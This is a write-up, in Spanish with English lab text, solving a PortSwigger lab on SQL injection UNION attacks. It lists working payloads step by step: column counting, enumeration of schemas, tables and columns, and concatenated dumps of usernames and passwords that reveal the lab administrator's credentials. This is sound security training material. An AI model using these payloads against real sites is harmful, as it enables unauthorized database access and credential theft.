# `LAB`: SQL injection UNION attack, retrieving multiple values in a single column

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a **SQL injection UNION attack** that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

---

### Explicación:

Este laboratiorio es exactamente igual al mismo, en realidad "la diferencia" es que solicitan mostrar la información **en una sola columna** pero ese ejemplo también se vió en el anterior.

- Debido a que la vulnerabilidad está en 2 columnas `'1','2'` se pueden usar ambar para poner la información, por ejemplo `'1':username` y `'2':password`, pero también se pueden poner ambas en una sola columna utilizando técnicas como `CONCAT`, `GROUP_CONCAT`, `||`, etc...

- OJO!!! A diferencia del laboratorio anterior, este escenario no permite mostrar resultados en columna `'1'`, es por eso que inyecto los querys en `'2'` únicamente

## Solución:

````py
# Original
https://666.web-security-academy.net/filter?category=Lifestyle

# Vulnerabilidad
https://666.web-security-academy.net/filter?category=Lifestyle'

# Sanar el Query
.web-security-academy.net/filter?category=Lifestyle' -- -

# Contando Columnas en la tabla que estoy (total = 2)
.web-security-academy.net/filter?category=Lifestyle' order by 2 -- -

# NOT WORKING!!! Contando Columnas en registro que estoy (total = 2) 
.web-security-academy.net/filter?category=Lifestyle'  union select 1,2 -- -

# Working!!! Invisible - Contando Columnas en registro que estoy (total = 2) 
.web-security-academy.net/filter?category=Lifestyle'  union select null,null -- -
# Working!!! Visible - Contando Columnas en registro que estoy (total = 2) 
.web-security-academy.net/filter?category=Lifestyle'  union select '1','2' -- -

### DUMP: schema, tables, columns

    # OJO!!! `Depende el lado de la inyección irá el "UNION SELECT <--> schema_name"`

# Enum Databases:

## Opt1 - Dump: schema_name = DBs 
.web-security-academy.net/filter?category=Lifestyle' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = DB = 1. public]

# Enum Tables (TODAS):
.web-security-academy.net/filter?category=Lifestyle' UNION SELECT '1',table_name FROM information_schema.tables -- -
## Opt3 - Dump: table_name = Tables (SOLO database() en este caso 'public')
.web-security-academy.net/filter?category=Lifestyle' UNION SELECT '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -

    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = Table = 1. users]
    ### [DUMP = Table = 2. products]

# Enum Columns:

## Opt1 - Dump: table_name = Tables (SOLO database() en este caso 'public')
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = Columns = 1. password]
    ### [DUMP = Columns = 1. username]

# Dump Data:

    # Aqui solo podemos arrojar el resultado en una sola columna

    # Nota GROUP_CONCAT: Casualmente `' UNION SELECT group_concat(username,password),'2' FROM users -- -` da error, pero es comúnmente usada. 

## Opt1 - Dump "username" + "password" (CONCAT)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',concat(username,' ::: ',password) FROM users -- -
## Opt2 - Dump "username" + "password" (*STRING COCATENATION - Port Swigger cheatsheet - ||' ::: '||)
https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',username||' ::: '||password FROM users -- -
    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
    ### [DUMP = Data = administrator ::: 0x35tx3qbzk3re93pdog]



````
